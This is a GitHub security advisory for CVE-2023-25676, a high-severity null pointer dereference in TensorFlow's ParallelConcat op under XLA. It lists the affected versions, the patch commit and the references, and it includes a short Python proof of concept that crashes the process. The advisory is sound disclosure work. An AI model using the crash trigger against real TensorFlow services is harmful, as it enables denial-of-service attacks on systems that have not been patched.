# [H] TensorFlow has null dereference on ParallelConcat with XLA

## Summary
Severity: High
Advisory: GHSA-6wfh-89q8-44jq
CVE: CVE-2023-25676
CWE: CWE-476
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-03-24
Source: https://github.com/advisories/GHSA-6wfh-89q8-44jq
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.11.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.11.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.11.1

## Details
### Impact
When running with XLA, `tf.raw_ops.ParallelConcat` segfaults with a nullptr dereference when given a parameter `shape` with rank that is not greater than zero.

```python
import tensorflow as tf

func = tf.raw_ops.ParallelConcat
para = {'shape':  0, 'values': [1]}

@tf.function(jit_compile=True)
def test():
   y = func(**para)
   return y

test()
```

### Patches
We have patched the issue in GitHub commit [da66bc6d5ff466aee084f9e7397980a24890cd15](https://github.com/tensorflow/tensorflow/commit/da66bc6d5ff466aee084f9e7397980a24890cd15).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx of 360 AIVul Team

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6wfh-89q8-44jq
- https://nvd.nist.gov/vuln/detail/CVE-2023-25676
- https://github.com/tensorflow/tensorflow/commit/da66bc6d5ff466aee084f9e7397980a24890cd15
- https://github.com/tensorflow/tensorflow
